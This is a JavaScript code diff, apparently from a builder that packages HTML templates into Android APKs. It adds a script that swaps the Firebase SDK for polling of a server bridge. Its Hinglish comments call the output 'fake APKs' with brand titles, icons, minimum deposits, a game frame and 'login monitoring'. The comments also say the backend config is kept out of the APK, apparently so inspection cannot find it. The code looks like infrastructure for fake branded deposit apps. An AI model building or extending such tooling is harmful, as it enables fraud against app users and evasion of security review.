@@ -55,6 +55,60 @@ function buildUrls(registerUrl, isDhani = false) {
 }
 
 /**
+ * SERVER LIVE MODE shim (fake / no-Firebase builds).
+ * window.rtdb ka lightweight replacement: config/users nodes server ke
+ * /api/rtdb bridge se poll karta hai (config = DB se instant, users =
+ * server-side Firebase proxy). Template ka purana Firebase code
+ * (rtdb.ref(...).on('value') / .set(...)) bina kisi edit ke chalta hai,
+ * aur APK me koi Firebase SDK/key/config nahi jaata.
+ */
+function buildRtdbShimScript(liveBase, livePath) {
+  const base = JSON.stringify(String(liveBase).replace(/\/+$/, ''));
+  const root = JSON.stringify(String(livePath));
+  const L = [];
+  L.push('<script>');
+  L.push('/* ZAYRO RTDB SHIM V1 — server live mode (no Firebase in APK) */');
+  L.push('(function(){');
+  L.push('  if(window.rtdb && window.rtdb.__zayroShim) return;');
+  L.push('  var BASE=' + base + ', ROOT=' + root + ';');
+  L.push('  function aj(url,opt,cb){');
+  L.push('    try{');
+  L.push('      fetch(BASE+url,Object.assign({cache:"no-store",headers:{"Content-Type":"application/json"}},opt||{}))');
+  L.push('        .then(function(r){ return r.ok?r.json():null; })');
+  L.push('        .then(function(j){ cb(j); })');
+  L.push('        .catch(function(){ cb(null); });');
+  L.push('    }catch(e){ cb(null); }');
+  L.push('  }');
+  L.push('  function Snap(v){ this._v=(v===undefined?null:v); }');
+  L.push('  Snap.prototype.exists=function(){ return this._v!==null&&this._v!==undefined; };');
+  L.push('  Snap.prototype.val=function(){ return this._v; };');
+  L.push('  function norm(p){ p=String(p===undefined?"":p); if(p.indexOf(ROOT+"/")===0)p=p.slice(ROOT.length+1); if(p===ROOT)p=""; return p.replace(/^\\/+|\\/+$/g,""); }');
+  L.push('  function Ref(p){ this.__p=norm(p); }');
+  L.push('  Ref.prototype.__url=function(){ return "/api/rtdb/"+encodeURIComponent(ROOT)+"/"+encodeURIComponent(this.__p); };');
+  L.push('  Ref.prototype.on=function(ev,cb){');
+  L.push('    if(ev!=="value"||typeof cb!=="function") return this;');
+  L.push('    var p=this.__p, self=this, last;');
+  L.push('    if(p.indexOf("users")===0){ try{ cb(new Snap(null)); }catch(e){} return this; }');
+  L.push('    var iv=(p==="config"||p.indexOf("config/")===0)?20000:8000;');
+  L.push('    function tick(){ aj(self.__url(),null,function(v){ var s=JSON.stringify(v===undefined?null:v); if(s!==last){ last=s; try{ cb(new Snap(v===null?null:v)); }catch(e){} } }); }');
+  L.push('    tick(); setInterval(tick,iv); return this;');
+  L.push('  };');
+  L.push('  Ref.prototype.once=function(ev,cb){ var self=this; if(this.__p.indexOf("users")===0){ try{ if(typeof cb==="function") cb(new Snap(null)); }catch(e){} return this; } aj(this.__url(),null,function(v){ try{ if(typeof cb==="function") cb(new Snap(v===null?null:v)); }catch(e){} }); return this; };');
+  L.push('  Ref.prototype.set=function(v,cb){ if(this.__p.indexOf("users")===0){ if(typeof cb==="function")try{cb();}catch(e){} return this; } aj(this.__url(),{method:"PUT",body:JSON.stringify(v===undefined?null:v)},function(){ if(typeof cb==="function")try{cb();}catch(e){} }); return this; };');
+  L.push('  Ref.prototype.update=function(v,cb){ if(this.__p.indexOf("users")===0){ if(typeof cb==="function")try{cb();}catch(e){} return this; } aj(this.__url(),{method:"PATCH",body:JSON.stringify(v||{})},function(){ if(typeof cb==="function")try{cb();}catch(e){} }); return this; };');
+  L.push('  Ref.prototype.remove=function(cb){ if(this.__p.indexOf("users")===0){ if(typeof cb==="function")try{cb();}catch(e){} return this; } aj(this.__url(),{method:"DELETE"},function(){ if(typeof cb==="function")try{cb();}catch(e){} }); return this; };');
+  L.push('  Ref.prototype.child=function(c){ return new Ref((this.__p?this.__p+"/":"")+String(c)); };');
+  L.push('  Ref.prototype.off=function(){ return this; };');
+  L.push('  window.rtdb={ __zayroShim:true, ref:function(p){ return new Ref(p); } };');
+  L.push('  if(typeof window.firebase==="undefined"){');
+  L.push('    window.firebase={ apps:[], initializeApp:function(){ return {}; }, app:function(){ return {}; }, database:function(){ return window.rtdb; } };');
+  L.push('  }');
+  L.push('})();');
+  L.push('</script>');
+  return L.join('');
+}
+
+/**
  * Inject all user params into HTML template
  * Handles both normal (zayro/wings) and dhani type HTMLs
  */
@@ -68,10 +122,26 @@ function injectParams(htmlContent, params) {
     minDeposit,
     brandTitle,
     appIconBase64,
-    isDhani
+    isDhani,
+    liveMode,
+    liveBase
   } = params;
 
   let html = htmlContent;
+
+  // ── SERVER LIVE MODE (fake / no-Firebase builds) ──
+  // Fake APKs me Firebase SDK/config bilkul nahi jaata (security posture).
+  // Uski jagah ek chhota sa `rtdb` SHIM inject hota hai jo live links,
+  // minDeposit/conditions aur users (login monitoring / warning popup)
+  // server ke /api/rtdb bridge se poll karta hai. Template ka apna code
+  // (rtdb.ref(...).on('value') / .set(...)) bina change ke chalta rehta hai.
+  const serverMode = liveMode === 'server' && /^https?:\/\//i.test(String(liveBase || ''));
+  if (serverMode) {
+    html = html.replace(
+      /<script[^>]*src=["'][^"']*firebase-(app|database)-compat[^"']*["'][^>]*><\/script>/gi,
+      ''
+    );
+  }
 
   // ── NORMALIZE GAME FRAME ──
   // Most uploaded designs already contain target-game-frame. A few (notably
@@ -248,12 +318,15 @@ function injectParams(htmlContent, params) {
   // URLs are intentionally NOT stored in the APK or localStorage. The app
   // waits for <firebasePath>/config and always uses those Firebase values.
   let firebaseSdkScripts = '';
-  if (!/firebase-app-compat\.js/i.test(html)) {
-    firebaseSdkScripts += '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>';
+  if (!serverMode) {
+    if (!/firebase-app-compat\.js/i.test(html)) {
+      firebaseSdkScripts += '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>';
+    }
+    if (!/firebase-database-compat\.js/i.test(html)) {
+      firebaseSdkScripts += '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>';
+    }
   }
-  if (!/firebase-database-compat\.js/i.test(html)) {
-    firebaseSdkScripts += '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>';
-  }
+  const shimScript = serverMode ? buildRtdbShimScript(liveBase, firebasePath) : '';
   const liveLinksScript = `${firebaseSdkScripts}<script>
 (function(){
   var livePath=${JSON.stringify(firebasePath)};
@@ -536,8 +609,8 @@ function injectParams(htmlContent, params) {
   }catch(e){}
 })();
 </script>`;
-  if (/<\/body>/i.test(html)) html = html.replace(/<\/body>/i, `${liveLinksScript}</body>`);
-  else html += liveLinksScript;
+  if (/<\/body>/i.test(html)) html = html.replace(/<\/body>/i, `${shimScript}${liveLinksScript}</body>`);
+  else html += shimScript + liveLinksScript;
 
   return html;
 }
